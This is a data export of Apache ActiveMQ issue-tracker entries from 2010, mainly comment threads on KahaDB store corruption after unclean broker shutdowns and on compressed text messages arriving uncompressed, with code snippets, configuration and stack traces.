The bug is consistently repeatable and is destructive in that files are left in an unrecoverable state - The ability of ActiveMQ to recover from a crash is a feature, so the the ability to recover from a simple restart is ultimately critical. ;;;","27/Sep/10 04:42;shiweiyuan;This issue maybe caused by lack of disk capacity.

when using the default configuration, i.e. the pending queue policy will be store based message cursor.
I found that the data folder size will increase very rapidly:
300,000 messages, 30 bytes per message, non_persistent,  the file named tmpDB.data  under data\localhost\tmp_storage\ will up to 1.15G in my environment.
so, pls check if your disk load/capacity is full.

But I'm still experiencing this issue after make sure the disk capacity is not full.
Will update on this issue if I get new evidence later...;;;","27/Sep/10 07:09;andyg;Tested in several environments, of which at least one is a very high spec system, all with plenty of free space. Same results, so nothing to do with capacity.

This seems to be pretty consistent, but even more so with schedulerSupport=true (occurs on practically every restart).
The point of failure is easy to track down at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454) - The question is more about why is the KahaDB file left in an unreadable state on a clean shutdown?;;;","04/Oct/10 08:33;fgynnild;This is a blocker issue for me, and it seems to be unrelated to the amount of available disk space.;;;","04/Oct/10 09:44;adamaitch;This renders 5.4.1 unusable for me. Had to roll back to 5.3.2.;;;","04/Oct/10 15:36;swapnonil;The reason I chose Active MQ 5.4 is because is of it's ""Message Scheduling"" feature, which is not there in 5.3. We are using the message scheduling feature released with 5.4. Our application needs messages to sit on a queue for at least 30 seconds.  
I am using the Spring JMS Template to send messages. This is how I am sending messages.
----	
{code:title=|borderStyle=none}
public Message createMessage(Session session) throws JMSException
{
    Date date = new Date();
    String delayInSeconds = properties.getProperty(MESSAGE_DELAY);
    Message message = session.createObjectMessage(mqRequest);
    message.setLongProperty(TIMESTAMP_AS_EPOCH_ATTRIBUTE, date.getTime());
    message.setStringProperty(TIMESTAMP_AS_STRING_ATTRIBUTE, getDateAsString(date));
    if (delayInSeconds != null)
    {
        LOGGER.info(""Delay set at "" + delayInSeconds + "" seconds"");
        message.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_DELAY, Integer.parseInt(delayInSeconds) * 1000);
    }
    return message;
}

{code}

I can downgrade to 5.3 but then how do I get message scheduling. Please advice.

I have checked disk capacity. There's no problem with that. 
By the way the stack trace I get is exactly what Andy posted.

I just deleted all the contents of localhost/scheduler directory, and started the broker again. This time it starts ok and is working fine.;;;","05/Oct/10 08:40;gtully;{code}useShutdownHook=""false""{code} is relevant. With a simple embedded broker Ctrl+C and restart without the shutdown hook, the stores are not stopped, in fact the broker is not stopped. A restart results in this problem every time. The store needs to be flushed on start which will should help but requires some code changes. In addition, this exception should be trapped such that it leads to recovery.

To work around, either {code}useShutdownHook=""true""{code} needs to be used such that the broker is stopped when the jvm is shutdown or there needs to be an explicit call to broker.stop()
;;;","05/Oct/10 09:02;eric-awl;Hi Gary

Do you confirm us that ""schedulerSupport=false"" is enough when we don't plan to use sheduled messages and don't want to have any files written on disk ?

Eric
;;;","05/Oct/10 09:03;s1ngle;In our configuration we have [and had] useShutdownHook=""true"", also we do not use db (only memory).

broker.setPersistenceAdapter(new MemoryPersistenceAdapter());
broker.setPersistent(false);
broker.setUseShutdownHook(true);
broker.setUseLoggingForShutdownErrors(false);

If we do not use: ""broker.setSchedulerSupport(false);"" the problem is 100% reproducible.

Although we were not able to reproduce it with a scheduler being off, we would not take a risk, as someone mentioned above, this setting only reduce the probability of the problem.;;;","05/Oct/10 09:39;andyg;Eric,

Only using ""schedulerSupport=false"" does NOT resolve this issue. The problem is specifically a KahaDB problem (the default persistence store is KahaDB).

Swapping out the persistence store is currently the only option. If you need 'any' persistence then I would suggest the jdbcPersistenceAdapter (the default uses a Derby Database, but many can be used).
This is substantially slower than KahaDB, but not enough to worry about if you are only pushing say several thousand messages a minute (you'd have to run your own tests). I am in fact happy enough with the performance that I am likely to stick with it for stabilities sake even if this issue is resolved.

<broker xmlns=""http://activemq.apache.org/schema/core""
          useJmx=""false""
          brokerName=""YourName""
          useShutdownHook=""false""
          persistent=""true""
          start=""false""
          schedulerSupport=""false""
          enableStatistics=""false"">

    <persistenceAdapter>
      <jdbcPersistenceAdapter dataDirectory=""activemq-data/jdbc""/>
    </persistenceAdapter>

.....

Note: If schedulerSupport is enabled then the error will still persist (excuse the pun) due to the fact that the scheduler uses KahaDB irrelevant of the persistenceAdapter - So if you want scheduler support then there is currently no option (unless someone knows how to configure the scheduler to use another store?).

Gary,

I should have mentioned that my configuration is for an OpenEJB RA, whereby the RA is responsible for starting and stopping ActiveMQ (which is does, and still produces a corrupt KahaDB) - The default OpenEJB RA config uses a memory store, but I require persistence for my project. A standalone application (basically as Krzysztof writes) which loops through start/stop will still produce the same stacktrace virtually every time.;;;","05/Oct/10 09:59;eric-awl;Hi Andy

I don't need nor scheduled Messages, nor Persistance. So I don't need KahaDB usage at all.

I wonder if, in this case, ""schedulerSupport=false"" is enough.

Eric;;;","05/Oct/10 11:24;gtully;I have found a problem with the recovery processing in the kahaDB pageFile/index but the issue only occurs when there has been an abortive close, as in the stop method of the broker was not called or did not complete or a file write did not complete with the clean shutdown flag set.
With a successful call to broker.stop() the problem is avoided as there is no recovery of the pageFile from the redo buffer at restart so it may not be the only issue here.

The latest 5.5-SNAPSHOT from maven or the repo has the fix. It would be great if you could validate.
https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.5-SNAPSHOT/

Andy, Krzysztof, Can you verify that the broker is actually stopped in your start/stop tests.There should be messages in the log of the form: 10:55:37,927 [main ] INFO  JobSchedulerStore - JobSchedulerStore:activemq-data/localhost/scheduler stopped

Eric, for your use case, schedulerSupport=false is sufficient.
;;;","05/Oct/10 11:47;ngehring;Gary - thanks for looking in to this.  We are going to test that it solves the issue we're seeing.

In the meantime a quick question please....  as we are running this in the background in Unix, how do we stop the broker gracefully?  The FAQ simply says to kill the process and I presume that this will not call broker.stop() correctly.
;;;","05/Oct/10 11:57;s1ngle;Gary, you are right.
After deleting activemq-data I verified following situation:
until I abnormally quit the application [and thus the broker.stop() is not invoked] everything starts OK
only after a crash/abnormal ending of an application the problem appears [in 100% cases] (deleting the data or setting schedulerSupport to false resolve the issue).;;;","05/Oct/10 12:32;gtully;Nik, so long as you don't use kill -9, and use one of the interrupt signals SIGHUP (Unix Only), SIGINT, or SIGTERM  instead, the jvm interruption handler will have a chance to kick in and call stop via the shutdownHooks registered by the broker.

But you can also use ./bin/activemq stop on unix, see : http://activemq.apache.org/unix-shell-script.html
I guess activemq stop is the preferred approach, it will try via jmx first and then revert to kill after some timeout.;;;","05/Oct/10 18:33;swapnonil;Hi Gary,

I can indeed confirm that in our case the problem started only after someone killed the activemq process using kill -9. As I reported earlier, when I deleted everything under localhost/scheduler folder and restarted activemq it started cleanly.

With regards to your suggestion of testing 5.5 Snapshot; Are you saying that with 5.5 activemq can recover correctly from these kill -9 type shutdowns and we won't see this ""Chunk Stream"" errors? ;;;","05/Oct/10 18:37;gtully;yes. it would be great if you could validate the fix.;;;","06/Oct/10 13:16;andyg;Gary,

Many thanks, the fix works so far. I am still in the process of further testing , but a corrupted KahaDB is now properly recovered on restart.

I think in my specific RA case that 'not' calling 'waitUntilStopped()'  in the RA may have caused the corruption - If the system exits too early then this would be the culprit.

I'll let you know if and when I find something.;;;","06/Oct/10 13:43;gtully;thanks for the validation andy, marking resolved.;;;","06/Oct/10 14:13;fgynnild;Great that you found and fixed this issue! What is the strategy of back porting critical and blocker issues like this? The severity of this bug leaves 5.4.* useless in a production environment, but it is still announced as the stable one.;;;","07/Oct/10 18:32;eduzanni;I agree with Frank. This issue has been affecting us too (we're using Fuse broker v. 5.4, which in turn relies on activeMQ 5.4). Is there any prevision regarding a ""patched"" release for version 5.4 with Gary's fix that can be used safely in a production environment?;;;","08/Oct/10 01:48;tomdz;FWIW, I get this issue on first write into a new KahaDB store, as well, though not consistently. In this particular case, ActiveMQ is used in a unit test and KahaDB is configured to write to a new temporary directory. The startup code looks like this:

File tmpDir = File.createTempFile(""activmq"", """");

tmpDir.delete();
tmpDir.mkdir();

KahaDBStore kaha = new KahaDBStore();

kaha.setDirectory(localDbDir);

BrokerService broker = new BrokerService();

broker.setUseShutdownHook(true);
broker.setPersistenceAdapter(kaha);
broker.addConnector(""vm://localhost:12345"" );
broker.start();

Then the very first message (jms producer using via a vm connection) fails with this error:

VMTransport org.apache.activemq.broker.TransportConnection.Transport Transport failed: java.io.EOFException: Chunk stream does not exist at page: 0
java.io.EOFException: Chunk stream does not exist at page: 0
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:404)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.activemq.broker.scheduler.JobSchedulerStore$3.execute(JobSchedulerStore.java:250)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.broker.scheduler.JobSchedulerStore.doStart(JobSchedulerStore.java:239)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.getStore(SchedulerBroker.java:197)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler(SchedulerBroker.java:184)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:131)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)
;;;","08/Oct/10 07:35;swapnonil;Hi Gary,

We verified the fix. It works as expected. 

However since there is no talk of merging this fix back to 5.4 we are going into production from Monday onwards with 5.5 Snapshot.

We thank you for applying this fix.;;;","08/Oct/10 14:01;fgynnild;I also tried the fix, and I no longer got the error message. But not all queues are working afterwards. Some queues work as expected, but for some of the other queues nothing gets into them. And there is no error messages either, neither on the server or the client side. Does anyone else experience this behavior?;;;","08/Oct/10 14:08;gtully;Frank, can you try an reproduce with trace level logging?;;;","10/Oct/10 18:08;norman;We saw the same exception in JAMES. IMHO a backport of the fix is a must because its really unacceptable to only be able to start again when purge all data. Thats just a no-go for a production service.. ;;;","21/Oct/10 21:21;eduzanni;Any news on the backport possibility for this issue? We'd like having the scheduled/delayed message delivery available, so reverting to version 5.3 wouldn't be so much of a nice option for us here.;;;","22/Oct/10 07:56;gtully;we will drop a new release 5.4.2 once we get completion on a few more outstanding issues.;;;","22/Oct/10 23:11;jns;Gary,
 Activemq 5.5 snapshot fix worked. Thanks for the fix. 
Can you provide us with an approximate 5.4.2 release date....Just a rough estimate would be fine.;;;","01/Nov/10 22:28;rbonneau;As requested by Eduardo Zanni above, can anyone supply a workaround if using 5.4.0?;;;","08/Nov/10 16:53;redvortex;We are also looking for either:

- A workaround for 5.4.1
- A 5.4.2 version that includes this fix

We need to move to 5.4.x from 5.3.2 but cannot do so because of this critical issue.;;;","11/Nov/10 02:20;okozlov;Could one of the Activemq developers provide a date for the next release that will include a fix for this issue? Whatever it will be.. 5.4.2 or 5.5.0.

We are in the final stage of developing an large system that will go to production in beginning of December and we are experiencing this issue in staging (using 5.4.1). It would be really nice to get a fix before Dec.1  If it's not possible - is there a patch for 5.4.1 or a workaround?

Really appreciate!

Regards,
Oleg.;;;","11/Nov/10 05:53;srodrigu85@gmail.com;@Oleg: The issue is resolved in the trunk, you can always pickup the latest sourcecode there and compile, or grab the nightly builds.
But there is a discussion in the mailing list, there should be a 5.4.2 soon.;;;","21/Dec/10 20:48;randy_palmer;It seems like schedulerSupport defaulted to true in 5.4.1.  It appears to default to false in 5.4.2 so you may need to explicitly set schedulerSupport=true on your broker when you update from 5.4.1. to 5.4.2 if it's not already in your config file.;;;","28/Sep/15 17:58;volkerk;This error still happens in 5.10 with the PList store (tmp_storage), which always uses kahaDB. A lot!;;;","09/Oct/15 02:49;fenghao0038;I met the same problem in 5.8 . I wonder  how did you resolve your problem in 5.10 , Using the workaround by set the schedulerSupport=false  ?
I will always use KahaDB and even sometimes need the scheduler function . 
Would you please share some of your good experience ?  Thanks;;;",,,,,,,,,,,
Compressed text message received by consumer uncompressed,AMQ-2929,12483860,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mwc_tonesoft,mwc_tonesoft,22/Sep/10 00:23,25/Feb/11 22:34,14/Jul/23 05:43,25/Feb/11 22:34,5.3.2,,,,,5.5.0,,,Broker,,,,1,,,,,,,,,"I have a queue setup to send and consume compressed text messages.  This is done via Spring setting ActiveMQConnectionFactory.useCompression to true.  If the consumer connects to this queue before the first message is arrives, everything works great.

If the messages are sent to this queue before the consumer connects, those early messages will cause ZipException ""unknown compression method"" when consumed by the belated consumer. Debugger shows that the ActiveMQTextMessage.content already contains the uncompressed text (with 4 leading length bytes) when ActiveMQTextMessage.getText() is called.

If I set useCompression to false, early messages are consumed with no problems.  Please look into this.

I notice that after ActiveMQTextMessage.getText() decompress the message, it does not set compressed to false. Not sure if that is the cause.
",ActiveMQ 5.3.2 / Camel 2.2.0,violatohr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Sep/10 00:17;mwc_tonesoft;ActiveMQConsumerTest.java;https://issues.apache.org/jira/secure/attachment/12461870/ActiveMQConsumerTest.java","23/Sep/10 00:17;mwc_tonesoft;ActiveMQConsumerTest.xml;https://issues.apache.org/jira/secure/attachment/12461871/ActiveMQConsumerTest.xml","14/Oct/10 22:19;mwc_tonesoft;ActiveMQProducerTest.java;https://issues.apache.org/jira/secure/attachment/12461869/ActiveMQProducerTest.java","14/Oct/10 22:19;mwc_tonesoft;ActiveMQProducerTest.xml;https://issues.apache.org/jira/secure/attachment/12461821/ActiveMQProducerTest.xml",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14692,,,Fri Feb 25 22:34:17 UTC 2011,,,,,,,,,,,"0|i0akdb:",59573,,,,,,,,,,,,,,,,,,,,,"22/Sep/10 10:13;mwc_tonesoft;Here is how the connection factory defined:

    <bean id=""jmsXmlFactory"" class=""org.apache.activemq.pool.PooledConnectionFactory""
          destroy-method=""stop"">
        <property name=""connectionFactory"">
            <bean class=""org.apache.activemq.ActiveMQConnectionFactory"">
                <property name=""brokerURL"" value=""${brokerConnectionURL}""/>
                <property name=""userName"" value=""${activemq.username}""/>
                <property name=""password"" value=""${activemq.password}""/>
                <property name=""clientIDPrefix"" value=""${processUniqueName}Xml-${serverId}-${pid}""/>
                <property name=""transformer"">
                    <bean class=""org.apache.activemq.util.xstream.XStreamMessageTransformer""/>
                </property>
                <property name=""useCompression"" value=""true""/>
            </bean>
        </property>
    </bean>
;;;","22/Sep/10 10:20;mwc_tonesoft;Another observation is that while the message is enqueued with no consumer, using JConsole [browseMessages] button on that queue shows the decompressed message text. I would expect it to be unreadable compressed binary.;;;","22/Sep/10 16:51;mwc_tonesoft;Debugger shows the mistake came off the wire. When the client reads the message from the wire, ActiveMQTextMessageMarshaller created the ActiveMQTextMessage with command.Message.compressed == true and Message.content contains decompressed text.

Therefore, there two ActiveMQ broker bugs:

1) The message queued with no consumer should not be decompressed.

2) When the message is decompressed, the compressed flag should be set to false before sending the message to the belated consumer.
;;;","22/Sep/10 18:42;mwc_tonesoft;Indeed adding the following line between line 88 and 89 of ActiveMQTextMessage.java fixed the second bug and offer a temporary workaround for the problem as a whole:

diff ActiveMQTextMessage.java patch/ActiveMQTextMessage.java 
88a89
>                     setCompressed(false);

The first bug mentioned above needs to be fixed, i.e. the broker must not call ActiveMQTextMessage.getText() to avoid decompressing the message when no consumer is available when the message is enqueued.
;;;","22/Sep/10 18:47;tabish;Can you provide a unit test or sample that demonstrates the issue, it would help to ensure the problem gets fixed and stays fixed.;;;","23/Sep/10 00:17;mwc_tonesoft;Attached the test source program and its Spring xml. A producer is needed that uses the same jmsFactory defined in this XML to pump some messages (compressed) to the ""test.registration"" queue before running the test program. No message will be retrieved due to the ZipException.;;;","24/Sep/10 19:30;tabish;Perhaps you could create a JUnit test case that reproduces this?  Or at least provide the source for  your producer?;;;","14/Oct/10 22:19;mwc_tonesoft;The producer code you asked for. Please fix the broker.;;;","09/Nov/10 01:56;mwc_tonesoft;Latest findings
============
An unconsumed message in a queue is decompressed when a JMX client code calls ""browse()"" on that Queue's MBean. Below is a stack trace captured by Eclipse (sorry about not having full class names).

""ActiveMQMonitorModule ... line: 86"" is where our code calls the ""browse"" method of the Queue's MBean. This led to ""ActiveMQTextMessage.getText() line: 83"", which decompressed the message, allocating large amount of memory, and possibly killing the broker altogether.

Another side effect is that the message is permanently decompressed in the queue, and due to the other bug mentioned in my 9/22 comment, the consumer receives a message that is decompressed but with the wrong (isCompressed() == true) result.

Our work-around is to call the MBean's ""browseMessages()"" with the patch for AMQ-3023. However, if you use JConsole to browse the unconsumed messages, it too will trigger the decompression of messages (possibly killing the broker due to out of memory). A nasty booby trap.

One possible fix is for OpenTypeSupport.TextMessageOpenTypeFactory.getFields(Object) to check for m.isCompressed(), and if true not to call m.getText().  See line 367 of OpenTypeSupport.java.

{code}
Thread [SelfMonitor] (Evaluating)	
	InflaterInputStream(InputStream) line: 91 [local variables unavailable]
	ActiveMQTextMessage.getText() line: 83 [local variables unavailable]	
	OpenTypeSupport$TextMessageOpenTypeFactory.getFields(Object) line: 367	
	OpenTypeSupport.convert(Message) line: 397	
	QueueView(DestinationView).browse(String) line: 151	
	QueueView(DestinationView).browse() line: 132	
	GeneratedMethodAccessor43.invoke(Object, Object[]) line: not available	
	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 25	
	Method.invoke(Object, Object...) line: 597	
	StandardMBeanIntrospector.invokeM2(Method, Object, Object[], Object) line: 93	
	StandardMBeanIntrospector.invokeM2(Object, Object, Object[], Object) line: 27	
	StandardMBeanIntrospector(MBeanIntrospector<M>).invokeM(M, Object, Object[], Object) line: 208	
	PerInterface<M>.invoke(Object, String, Object[], String[], Object) line: 120	
	StandardMBeanSupport(MBeanSupport<M>).invoke(String, Object[], String[]) line: 262	
	AnnotatedMBean(StandardMBean).invoke(String, Object[], String[]) line: 391	
	DefaultMBeanServerInterceptor.invoke(ObjectName, String, Object[], String[]) line: 836	
	JmxMBeanServer.invoke(ObjectName, String, Object[], String[]) line: 761	
	ActiveMQMonitorModule$1QueueValueAccessor.getValue() line: 86	
	ActiveMQMonitorModule$1QueueValueAccessor.getValue() line: 67	
	BaseModuleAttribute<D>.getCurrentValue() line: 106	
	ActiveMQMonitorModule(BaseMonitorModule).getCurrentModuleData() line: 105	
	MonitorData.populateModuleData(MonitorModule) line: 195	
	MonitorGenerator.process() line: 135	
	BaseRouteBuilder$1.run() line: 81	
	BaseRouteBuilder$2.run() line: 176	
	TimerThread.mainLoop() line: 512	
	TimerThread.run() line: 462	
{code};;;","25/Feb/11 22:34;tabish;TextMessage class now clears the compressed flag when its body is uncompressed to avoid receiving a message in an invalid state.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
OutOfMemory exception possible when using ByteMessage-s due to JVM bug,AMQ-2919,12483806,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,15/Sep/10 11:36,03/Dec/10 09:42,14/Jul/23 05:43,15/Sep/10 11:39,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,Due to following  http://bugs.sun.com/view_bug.do?bug_id=4797189 the custom deflator is not closed when used with DeflaterOutputStream. A workaround is to explicitly close it.,,eric-awl,timg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14841,,,Fri Dec 03 09:42:13 UTC 2010,,,,,,,,,,,"0|i0ba27:",63742,,,,,,,,,,,,,,,,,,,,,"15/Sep/10 11:39;dejanb;Fixed with svn revision 997290;;;","26/Oct/10 10:46;timg;We are experiencing a problem in 5.4.1 (with Spring 3.0.4) which appears to be related to this fix. No problems with 5.4.0 and the same configuration.

It looks like ActiveMQBytesMessage.storeContent closes the DeflaterStream prematurely, leaving initializeWriting with nothing to close.

Error log:
{noformat}
Caused by: java.lang.NullPointerException: Deflater has been closed
	at java.util.zip.Deflater.ensureOpen(Deflater.java:427)
	at java.util.zip.Deflater.deflate(Deflater.java:305)
	at java.util.zip.DeflaterOutputStream.deflate(DeflaterOutputStream.java:159)
	at java.util.zip.DeflaterOutputStream.finish(DeflaterOutputStream.java:134)
	at java.util.zip.DeflaterOutputStream.close(DeflaterOutputStream.java:146)
	at java.io.FilterOutputStream.close(FilterOutputStream.java:143)
	at org.apache.activemq.command.ActiveMQBytesMessage$1.close(ActiveMQBytesMessage.java:808)
	at java.io.FilterOutputStream.close(FilterOutputStream.java:143)
	at org.apache.activemq.command.ActiveMQBytesMessage.storeContent(ActiveMQBytesMessage.java:124)
	at org.apache.activemq.command.ActiveMQBytesMessage.reset(ActiveMQBytesMessage.java:765)
	...
	at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:565)
	at org.springframework.jms.core.JmsTemplate$3.doInJms(JmsTemplate.java:536)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:466)
	at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:534)
{noformat}
	
;;;","28/Oct/10 11:51;dejanb;Hi Tim,

any chance you can create a test case that demonstrates the issue?

Thanks,
Dejan;;;","03/Dec/10 09:42;timg;It looks like this has been raised again here, with a suggested patch: AMQ-3062;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Associated advisory topics aren't cleaned up when a topic/queue is deleted via AdminView,AMQ-2915,12483530,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,slewis,slewis,13/Sep/10 17:38,13/Sep/10 19:11,14/Jul/23 05:43,13/Sep/10 19:11,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"Basically when you create a queue/topic and connect either a producer or consumer to that queue/topic advisory topics are created; if you later delete the queue/topic the advisory topics aren't cleaned up.  This could become a problem for folks that tend to create and destroy queues/topics often for whatever reason.  Patch fixes this and adds a test for topics and queues.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/10 17:39;slewis;AMQ-2915.txt;https://issues.apache.org/jira/secure/attachment/12461858/AMQ-2915.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14810,,,Mon Sep 13 19:11:35 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba3r:",63749,,,,,,,,,,,,,,,,,,,,,"13/Sep/10 19:11;tabish;Patch applied, tests all passing.  Thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Startup script does not respect JAVA_HOME environment variable.,AMQ-2912,12483534,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,pschwamb,pschwamb,13/Sep/10 15:35,13/Sep/10 20:46,14/Jul/23 05:43,13/Sep/10 20:46,5.4.0,,,,,5.4.1,,,Broker,,,,0,,,,,,,,,"With the latest release, if java is not in PATH, and JAVA_HOME is set to a valid jdk path, the bin/activemq script will report ""ERROR: Configuration varaiable JAVA_HOME or JAVACMD is not defined correctly."".

This used to work in earlier 5.x versions.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/10 15:36;pschwamb;respect_java_home.patch;https://issues.apache.org/jira/secure/attachment/12461865/respect_java_home.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14795,,,Mon Sep 13 20:46:02 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba2v:",63745,Regression,,,,,,,,,,,,,,,,,,,,"13/Sep/10 20:46;gtully;applied in r996684 with thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException in kahadb linked list,AMQ-2910,12483544,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,behrmann,behrmann,13/Sep/10 12:08,01/Sep/16 15:55,14/Jul/23 05:43,16/Sep/10 17:10,5.4.0,,,,,5.4.1,,,Message Store,,,,0,,,,,,,,,"We got the following NullPointerException in kahadb.

13 Sep 2010 05:53:30 (JMS) [] Caught an Exception adding a message: ActiveMQObjectMessage {commandId = 111839609, responseRequired = false, messageId = ID:statler.ndgf.org-42286-1282568899957-0:0:2:1:43748846, originalDestination = null, originalTransactionId = null, producerId = ID:statler.ndgf.org-42286-1282568899957-0:0:2:1, destination = queue://cells.domain.dCacheDomain, transactionId = null, expiration = 0, timestamp = 0, arrival = 0, brokerInTime = 1284350009950, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@1bada5d, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor 
java.lang.NullPointerException: null
        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:231) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~[activemq-all-5.4.0.jar:5.4.0]
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~[activemq-all-5.4.0.jar:5.4.0]
